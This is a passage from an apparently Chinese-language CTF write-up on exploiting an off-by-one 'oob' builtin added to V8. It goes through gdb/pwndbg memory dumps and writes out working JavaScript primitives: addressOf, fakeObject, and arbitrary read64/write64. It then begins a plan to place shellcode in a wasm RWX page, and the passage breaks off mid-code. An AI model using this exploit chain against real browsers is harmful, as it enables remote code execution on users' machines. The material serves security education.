+</span></span><span style=display:flex><span><span style=color:#40a070>384</span><span style=color:#666>:+</span>}
+</span></span></code></pre></div><p>len 维护了方法调用时的参数个数。注意类似于 C++，js 中函数调用时 this 指针也会作为第一个参数传入，所以参数长度为 1 也就是没有提供参数。该方法有两种操作模式，当调用参数为 0 时，即</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>arr.oob()
+</span></span></code></pre></div><p>效果就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>return</span> arr[arr.length]
+</span></span></code></pre></div><p>而</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>arr.oob(val)
+</span></span></code></pre></div><p>效果就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>arr[arr.length] <span style=color:#666>=</span> val
+</span></span></code></pre></div><p>可以看到这里有一个典型的栅栏错误，可以越界一个单位进行读写。</p><h3 id=编译调试环境>编译调试环境</h3><p>题目浏览器使用的 v8 对应的 commit 版本为 <code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p><p>先滚至题目的代码版本</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git reset --hard  6dc88c191f5ecc5389dc26efa3ca0907faef3598
+</span></span><span style=display:flex><span>git checkout
+</span></span><span style=display:flex><span>git apply &lt; oob.diff
+</span></span></code></pre></div><p>然后此题如果使用 debug 模式编译，调试时据说会出现问题，为了不浪费人生，我也没编译去看到底有什么问题，就用了 release 版本，按照语神的说法，为了使用 job 等调试命令，需要在 <code>out.gn/x64.release/args.gn</code> 文件加入以下内容：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>v8_enable_backtrace = true
+</span></span><span style=display:flex><span>v8_enable_disassembler = true
+</span></span><span style=display:flex><span>v8_enable_object_print = true
+</span></span><span style=display:flex><span>v8_enable_verify_heap = true
+</span></span></code></pre></div><p>编译即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>tools/dev/v8gen.py x64.release <span style=color:#666>&amp;&amp;</span> ninja -C out.gn/x64.release
+</span></span></code></pre></div><h3 id=利用>利用</h3><p>漏洞就是 8 字节溢出任意读写，这个溢出可以做什么与数组的结构有关，这里也仿照小语的博客对一些数组的类型进行调试，也可以顺便学习以下调试的方法。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> int_arr <span style=color:#666>=</span> [<span style=color:#40a070>1</span>, <span style=color:#40a070>2</span>, <span style=color:#40a070>3</span>];
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float_arr <span style=color:#666>=</span> [<span style=color:#40a070>1.1</span>, <span style=color:#40a070>1.2</span>, <span style=color:#40a070>1.3</span>];
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> obj <span style=color:#666>=</span> {<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>:</span> <span style=color:#40a070>1</span>};
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> object_arr <span style=color:#666>=</span> [obj, obj, obj];
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> newed_arr <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> <span style=color:#007020>Array</span>(<span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#666>%</span>DebugPrint(int_arr);
+</span></span><span style=display:flex><span><span style=color:#666>%</span>SystemBreak();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#666>%</span>DebugPrint(float_arr);
+</span></span><span style=display:flex><span><span style=color:#666>%</span>SystemBreak();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#666>%</span>DebugPrint(object_arr);
+</span></span><span style=display:flex><span><span style=color:#666>%</span>SystemBreak();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#666>%</span>DebugPrint(newed_arr);
+</span></span><span style=display:flex><span><span style=color:#666>%</span>SystemBreak();
+</span></span></code></pre></div><p>保存脚本到 <code>debug.js</code>，使用 <code>gdb d8</code> 准备进行调试，首先设置参数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#007020>set</span> args --allow-natives-syntax ./debug.js
+</span></span></code></pre></div><p>然后 <code>r</code> 即可。</p><p>执行流执行到 %DebugPrint(int_arr) 的时候，就会输出 int_arr 对象的地址和类型，执行到 %SystemBreak() 时，就会自动断下</p><p><img src=https://www.cjovi.icu/usr/uploads/2021/11/166615067.png alt="debug 情况"></p><p>对象地址使用 job 命令即可显示出对象的属性</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>pwndbg&gt; job 0x2f6f32c4dee1
+</span></span><span style=display:flex><span>0x2f6f32c4dee1: [JSArray]
+</span></span><span style=display:flex><span> - map: 0x2fd1f0cc2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]
+</span></span><span style=display:flex><span> - prototype: 0x31020c111111 &lt;JSArray[0]&gt;
+</span></span><span style=display:flex><span> - elements: 0x2f6f32c4ddf9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]
+</span></span><span style=display:flex><span> - length: 3
+</span></span><span style=display:flex><span> - properties: 0x2c53d6f40c71 &lt;FixedArray[0]&gt; {
+</span></span><span style=display:flex><span>    #length: 0x2a585ac401a9 &lt;AccessorInfo&gt; (const accessor descriptor)
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span> - elements: 0x2f6f32c4ddf9 &lt;FixedArray[3]&gt; {
+</span></span><span style=display:flex><span>           0: 1
+</span></span><span style=display:flex><span>           1: 2
+</span></span><span style=display:flex><span>           2: 3
+</span></span><span style=display:flex><span> }
+</span></span></code></pre></div><p>可以看到 DebugPrint 出来的对象地址的最低位为 1，这是因为 32 位和 64 位的地址对齐保证最低位一定为 0，v8 便使用该位标记指针所指向的对象的属性，如果被指的对象是一个 js 对象，便在最低位置 1。</p><p>观察 int_arr 的空间分布，可以看到头部有一个 map 指针，这是 v8 用来实现动态类型的核心。map 对象维护了某一对象当前的类型，引用源码注释</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// All heap objects have a Map that describes their structure.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//  A Map contains information about:
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//  - Size information about the object
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//  - How to iterate over an object (for garbage collection)
+</span></span></span></code></pre></div><p>实际上 map 还会指导 v8 对某对象的各种操作。不难想到，如果能够伪造某对象的 map 指针，就可以实现类型混淆，达成进一步利用。</p><p>对于本题而言，为了实现修改 map，还需要了解 elements 指向的对象的结构。</p><p>同时也可见 elements 的地址是 <code>0x2f6f32c4ddf9</code>，对该指针执行 job，可得（我这里新开了一次调试，所以地址有变）</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>pwndbg&gt; job 0x04c54214ddf9
+</span></span><span style=display:flex><span>0x4c54214ddf9: <span style=color:#666>[</span>FixedArray<span style=color:#666>]</span>
+</span></span><span style=display:flex><span> - map: 0x09dcb47c0851 &lt;Map&gt;
+</span></span><span style=display:flex><span> - length: <span style=color:#40a070>3</span>
+</span></span><span style=display:flex><span>           0: <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>           1: <span style=color:#40a070>2</span>
+</span></span><span style=display:flex><span>           2: <span style=color:#40a070>3</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>pwndbg&gt; telescope 0x04c54214ddf8
+</span></span><span style=display:flex><span>00:0000│  0x4c54214ddf8 —▸ 0x9dcb47c0851 ◂— 0x9dcb47c01
+</span></span><span style=display:flex><span>01:0008│  0x4c54214de00 ◂— 0x300000000
+</span></span><span style=display:flex><span>02:0010│  0x4c54214de08 ◂— 0x100000000
+</span></span><span style=display:flex><span>03:0018│  0x4c54214de10 ◂— 0x200000000
+</span></span><span style=display:flex><span>04:0020│  0x4c54214de18 ◂— 0x300000000
+</span></span><span style=display:flex><span>05:0028│  0x4c54214de20 —▸ 0x9dcb47c0801 ◂— 0x9dcb47c01
+</span></span><span style=display:flex><span>06:0030│  0x4c54214de28 ◂— 0x300000000
+</span></span><span style=display:flex><span>07:0038│  0x4c54214de30 —▸ 0x3ade51f451 ◂— 0x9a000009dcb47c05
+</span></span></code></pre></div><p>可以看到 elements 指向的是一个 <code>FixedArray</code> 类维护了数组存储数据的区域，作为一个对象，头部也存储了一个 map。第二个字段则维护了数组的长度。考虑到我们只能溢出 8 个字节，这里无法实现有效的利用。</p><p>使用 <code>c</code> 继续执行，查看 float_arr 的内存环境</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>pwndbg&gt; job 0x04c54214df29
+</span></span><span style=display:flex><span>0x4c54214df29: [JSArray]
+</span></span><span style=display:flex><span> - map: 0x310589b82ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+</span></span><span style=display:flex><span> - prototype: 0x003ade511111 &lt;JSArray[0]&gt;
+</span></span><span style=display:flex><span> - elements: 0x04c54214df01 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]
+</span></span><span style=display:flex><span> - length: 3
+</span></span><span style=display:flex><span> - properties: 0x09dcb47c0c71 &lt;FixedArray[0]&gt; {
+</span></span><span style=display:flex><span>    #length: 0x159e27e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span> - elements: 0x04c54214df01 &lt;FixedDoubleArray[3]&gt; {
+</span></span><span style=display:flex><span>           0: 1.1
+</span></span><span style=display:flex><span>           1: 1.2
+</span></span><span style=display:flex><span>           2: 1.3
+</span></span><span style=display:flex><span> }
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>pwndbg&gt; telescope 0x04c54214df01-1
+</span></span><span style=display:flex><span>00:0000│  0x4c54214df00 —▸ 0x9dcb47c14f9 ◂— 0x9dcb47c01
+</span></span><span style=display:flex><span>01:0008│  0x4c54214df08 ◂— 0x300000000
+</span></span><span style=display:flex><span>02:0010│  0x4c54214df10 ◂— 0x3ff199999999999a
+</span></span><span style=display:flex><span>03:0018│  0x4c54214df18 ◂— 0x3ff3333333333333
+</span></span><span style=display:flex><span>04:0020│  0x4c54214df20 ◂— 0x3ff4cccccccccccd
+</span></span><span style=display:flex><span>05:0028│  0x4c54214df28 —▸ 0x310589b82ed9 ◂— 0x4000009dcb47c01
+</span></span><span style=display:flex><span>06:0030│  0x4c54214df30 —▸ 0x9dcb47c0c71 ◂— 0x9dcb47c08
+</span></span><span style=display:flex><span>07:0038│  0x4c54214df38 —▸ 0x4c54214df01 ◂— 0x9dcb47c14
+</span></span></code></pre></div><p>可以看到这里 elements 指向的 <code>FixedDoubleArray</code> 类实例和 float_arr 紧邻，通过溢出 8 个字节可以直接修改 float_arr 的 map 指针，这样就可以实现类型混淆了。</p><p>继续向下执行，可以发现对象数组的 elements 也可以实现修改 map。</p><p>利用类型混淆，可以实现 leak。仍然利用上面的调试脚本，查看对象数组的内存结构</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>pwndbg&gt; job 0x04c54214dfc1
+</span></span><span style=display:flex><span>0x4c54214dfc1: [JSArray]
+</span></span><span style=display:flex><span> - map: 0x310589b82f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
+</span></span><span style=display:flex><span> - prototype: 0x003ade511111 &lt;JSArray[0]&gt;
+</span></span><span style=display:flex><span> - elements: 0x04c54214df99 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]
+</span></span><span style=display:flex><span> - length: 3
+</span></span><span style=display:flex><span> - properties: 0x09dcb47c0c71 &lt;FixedArray[0]&gt; {
+</span></span><span style=display:flex><span>    #length: 0x159e27e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span> - elements: 0x04c54214df99 &lt;FixedArray[3]&gt; {
+</span></span><span style=display:flex><span>         0-2: 0x04c54214df49 &lt;Object map = 0x310589b8ab39&gt;
+</span></span><span style=display:flex><span> }
+</span></span></code></pre></div><p>对象被存储在 elements 指向的 FixedArray 数组中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>pwndbg&gt; job 0x04c54214df99
+</span></span><span style=display:flex><span>0x4c54214df99: [FixedArray]
+</span></span><span style=display:flex><span> - map: 0x09dcb47c0801 &lt;Map&gt;
+</span></span><span style=display:flex><span> - length: 3
+</span></span><span style=display:flex><span>         0-2: 0x04c54214df49 &lt;Object map = 0x310589b8ab39&gt;
+</span></span><span style=display:flex><span>pwndbg&gt; telescope 0x04c54214df99-1
+</span></span><span style=display:flex><span>00:0000│  0x4c54214df98 —▸ 0x9dcb47c0801 ◂— 0x9dcb47c01
+</span></span><span style=display:flex><span>01:0008│  0x4c54214dfa0 ◂— 0x300000000
+</span></span><span style=display:flex><span>02:0010│  0x4c54214dfa8 —▸ 0x4c54214df49 ◂— 0x710000310589b8ab
+</span></span><span style=display:flex><span>... ↓     2 skipped
+</span></span><span style=display:flex><span>05:0028│  0x4c54214dfc0 —▸ 0x310589b82f79 ◂— 0x4000009dcb47c01
+</span></span><span style=display:flex><span>06:0030│  0x4c54214dfc8 —▸ 0x9dcb47c0c71 ◂— 0x9dcb47c08
+</span></span><span style=display:flex><span>07:0038│  0x4c54214dfd0 —▸ 0x4c54214df99 ◂— 0x9dcb47c08
+</span></span></code></pre></div><p>自然的，使用对象的指针来维护每个对象，所以如果把一个对象数组混淆为浮点数组，访问 object_array[i] 的时候，就会以浮点数的形式返回对象的地址。反之，向浮点数组中写入对象地址再混淆为对象数组，访问时就会直接把该地址作为一个对象返回了，由此可以写出 leak 函数和伪造对象函数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float_arr <span style=color:#666>=</span> [<span style=color:#40a070>1.1</span>];
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> obj <span style=color:#666>=</span> {<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>:</span> <span style=color:#40a070>1</span>};
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> object_arr <span style=color:#666>=</span> [obj];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float_arr_map <span style=color:#666>=</span> float_arr.oob();
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> object_arr_map <span style=color:#666>=</span> object_arr.oob();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// get the address of obj
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {object} obj: obj to leak
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {uint64}: address of obj 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> addressOf(obj) {
+</span></span><span style=display:flex><span>    object_arr[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> obj;
+</span></span><span style=display:flex><span>    object_arr.oob(float_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>let</span> address <span style=color:#666>=</span> object_arr[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>    object_arr.oob(object_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> f2i(address);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// return a object which address is `address` 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// return object (*address);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {object}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> fakeObject(address) {
+</span></span><span style=display:flex><span>    float_arr[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i2f(address);
+</span></span><span style=display:flex><span>    float_arr.oob(object_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>let</span> obj <span style=color:#666>=</span> float_arr[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>    float_arr.oob(float_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> obj;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>为了转换浮点数和地址，可以实现两个工具函数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buf <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> ArrayBuffer(<span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float64 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Float64Array(buf);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> uint64 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> BigUint64Array(buf);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {float64} float_num
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {uint64}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> f2i(float_num) {
+</span></span><span style=display:flex><span>    float64[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> float_num;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> uint64[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} uint64_num
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {float64}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> i2f(uint64_num) {
+</span></span><span style=display:flex><span>    uint64[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> uint64_num;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> float64[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>既然可以 leak 和伪造对象了，就可以考虑任意地址读写了。我们可以在一个数组中伪造一个数组对象，leak 出该对象地址，通过之前实现的对象伪造就可以获得一个 elements 指向任意地址的数组了。通过该数组就可以实现任意地址读写。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> rw_tool <span style=color:#666>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// map
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    float_arr_map,
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// prototype
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(<span style=color:#40a070>0</span>n),
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// elements
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(<span style=color:#40a070>0xBEEFDEAD</span>n),
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// length
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(<span style=color:#40a070>0x1000000000</span>n),
+</span></span><span style=display:flex><span>    <span style=color:#40a070>1.1</span>,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>1.2</span>
+</span></span><span style=display:flex><span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> rw_tool_addr <span style=color:#666>=</span> addressOf(rw_tool);
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;rw_tool_addr: 0x&#34;</span> <span style=color:#666>+</span> rw_tool_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> arbitary_rw_obj <span style=color:#666>=</span> fakeObject(rw_tool_addr <span style=color:#666>-</span> <span style=color:#40a070>0x30</span>n);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// return *((uint64*) address)
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {uint64}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> read64(address) {
+</span></span><span style=display:flex><span>    rw_tool[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> i2f(address <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>n <span style=color:#666>+</span> <span style=color:#40a070>1</span>n);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> f2i(arbitary_rw_obj[<span style=color:#40a070>0</span>]);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// *((uint64*) address) = val
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} val
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> write64(address, val) {
+</span></span><span style=display:flex><span>    rw_tool[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> i2f(address <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>n <span style=color:#666>+</span> <span style=color:#40a070>1</span>n);
+</span></span><span style=display:flex><span>    arbitary_rw_obj[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i2f(val);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>任意地址读写后的利用，可以通过 Linux 用户态 pwn 常用的 leak 后攻击各种 hook 指针劫持执行流，这种方式最重要的是要 leak 出进程的基址。一般的套路为，对于一个 js 数组 a=[1]，在 <code>a->map->constructor->code</code> 的固定偏移处，存在一条指令将进程的地址 mov 到寄存器中，通过读该处的内存即可实现 leak。</p><p>不过这里也可以通过 shellcode 实现利用，与 wasm 有关。利用<a href=https://wasdk.github.io/WasmFiddle>这个网站</a>可以生成一段 wasm 码，我们可以这样来生成一个函数对象</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> wasmCode <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Uint8Array([<span style=color:#40a070>0</span>,<span style=color:#40a070>97</span>,<span style=color:#40a070>115</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>133</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>96</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>127</span>,<span style=color:#40a070>3</span>,<span style=color:#40a070>130</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>4</span>,<span style=color:#40a070>132</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>112</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>5</span>,<span style=color:#40a070>131</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>6</span>,<span style=color:#40a070>129</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>7</span>,<span style=color:#40a070>145</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>2</span>,<span style=color:#40a070>6</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>101</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>111</span>,<span style=color:#40a070>114</span>,<span style=color:#40a070>121</span>,<span style=color:#40a070>2</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>4</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>97</span>,<span style=color:#40a070>105</span>,<span style=color:#40a070>110</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>10</span>,<span style=color:#40a070>138</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>132</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>65</span>,<span style=color:#40a070>42</span>,<span style=color:#40a070>11</span>]);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> wasmModule <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> WebAssembly.Module(wasmCode);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> wasmInstance <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> WebAssembly.Instance(wasmModule, {});
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> f <span style=color:#666>=</span> wasmInstance.exports.main;
+</span></span></code></pre></div><p>在 <code>f->shared_info->data->instance</code> 的固定偏移处（这个偏移据说与许多东西相关，可以通过调试得出，这里是 0x88），储存了一个 rwx 的内存段的地址，这个内存段本身是为了 f 的调用的，由于我们可以任意地址写，所以向这里写入 shellcode，调用 f 后就可以任意代码执行了。</p><p>首先 leak 出内存段地址</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>addr_f <span style=color:#666>=</span> addressOf(f);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>console.log(f());
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;f_addr: 0x&#34;</span> <span style=color:#666>+</span> addr_f.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> shared_info_addr <span style=color:#666>=</span> read64(addr_f <span style=color:#666>-</span> <span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x18</span>n)
